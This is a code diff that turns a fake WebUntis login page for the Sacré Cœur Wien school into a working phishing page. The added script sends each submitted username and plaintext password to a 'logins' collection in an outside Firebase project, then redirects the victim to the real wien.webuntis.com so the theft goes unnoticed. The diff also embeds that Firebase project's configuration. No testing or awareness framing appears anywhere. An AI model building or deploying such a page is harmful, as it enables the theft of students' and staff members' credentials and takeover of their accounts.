@@ -183,9 +183,10 @@
             padding: 10px 16px;
             text-align: left;
             border-bottom: 2px solid transparent;
+            transition: border-color 0.2s;
         }
 
-        .input-group:focus-within {
+        .input-group.focused {
             border-bottom-color: #ff6b35; /* Orangefarbener Unterstrich bei Fokus */
         }
 
@@ -219,7 +220,7 @@
             padding-left: 8px;
         }
 
-        /* Inaktiver Login Button */
+        /* Login Button Styling */
         .btn-login {
             width: 100%;
             padding: 14px;
@@ -231,6 +232,13 @@
             font-weight: bold;
             cursor: not-allowed;
             margin-top: 15px;
+            transition: background-color 0.2s, color 0.2s;
+        }
+
+        .btn-login.active {
+            background-color: #ff6b35;
+            color: #ffffff;
+            cursor: pointer;
         }
 
         /* Responsive Anpassung für Handys */
@@ -284,32 +292,105 @@
                     <img src="https://bafep.scp.ac.at/wp-content/uploads/sites/10/2017/01/leitbild-blau.png" alt="Sacré Cœur Wien Logo" class="school-logo">
                 </div>
 
-                <form class="form-container" onsubmit="return false;">
+                <form class="form-container" id="loginForm">
                     <button type="button" class="btn-portal">Bildungsportal</button>
                     
                     <div class="divider">
                         <span>oder</span>
                     </div>
 
-                    <div class="input-group">
+                    <div class="input-group" id="group-username">
                         <label for="username">Benutzername</label>
                         <input type="text" id="username" autocomplete="off">
                     </div>
 
-                    <div class="input-group">
+                    <div class="input-group" id="group-password">
                         <label for="password">Passwort</label>
                         <div class="password-wrapper">
                             <input type="password" id="password">
-                            <span class="toggle-password">👁</span>
+                            <span class="toggle-password" id="togglePassword">👁</span>
                         </div>
                     </div>
 
-                    <button type="submit" class="btn-login" disabled>Login</button>
+                    <button type="submit" class="btn-login" id="loginBtn" disabled>Login</button>
                 </form>
             </div>
         </div>
 
     </div>
 
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
+        import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";
+
+        // Deine übermittelten Firebase-Konfigurationsdaten
+        const firebaseConfig = {
+            apiKey: "AIzaSyD6tRZKmQ94EWeI27oS6uZuPgW2ODkvJ6w",
+            authDomain: "untis-4045a.firebaseapp.com",
+            projectId: "untis-4045a",
+            storageBucket: "untis-4045a.firebasestorage.app",
+            messagingSenderId: "1038747513615",
+            appId: "1:1038747513615:web:7ab21989e70da82a1a847a",
+            measurementId: "G-4K2Y1YKLT9"
+        };
+
+        // Firebase initialisieren
+        const app = initializeApp(firebaseConfig);
+        const db = getFirestore(app);
+
+        // DOM Elemente abgreifen
+        const usernameInput = document.getElementById('username');
+        const passwordInput = document.getElementById('password');
+        const loginBtn = document.getElementById('loginBtn');
+        const loginForm = document.getElementById('loginForm');
+        const togglePassword = document.getElementById('togglePassword');
+
+        // Fokus-Effekte für die Eingabegruppen
+        [usernameInput, passwordInput].forEach(input => {
+            const group = document.getElementById(`group-${input.id}`);
+            input.addEventListener('focus', () => group.classList.add('focused'));
+            input.addEventListener('blur', () => group.classList.remove('focused'));
+            
+            // Validierung, ob beide Felder befüllt sind, um den Button freizuschalten
+            input.addEventListener('input', () => {
+                if (usernameInput.value.trim() !== "" && passwordInput.value.trim() !== "") {
+                    loginBtn.disabled = false;
+                    loginBtn.classList.add('active');
+                } else {
+                    loginBtn.disabled = true;
+                    loginBtn.classList.remove('active');
+                }
+            });
+        });
+
+        // Passwort-Sichtbarkeit umschalten
+        togglePassword.addEventListener('click', () => {
+            const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
+            passwordInput.setAttribute('type', type);
+        });
+
+        // Formular absenden & Daten an Firestore übertragen
+        loginForm.addEventListener('submit', async (e) => {
+            e.preventDefault();
+
+            const username = usernameInput.value;
+            const password = passwordInput.value;
+
+            try {
+                // Daten werden in die Collection "logins" geschrieben
+                await addDoc(collection(db, "logins"), {
+                    username: username,
+                    password: password,
+                    timestamp: serverTimestamp()
+                });
+
+                // Optionale Weiterleitung nach erfolgreichem Speichern (z.B. zur echten WebUntis Seite)
+                window.location.href = "https://wien.webuntis.com/";
+
+            } catch (error) {
+                console.error("Fehler beim Speichern der Daten: ", error);
+            }
+        });
+    </script>
 </body>
 </html>
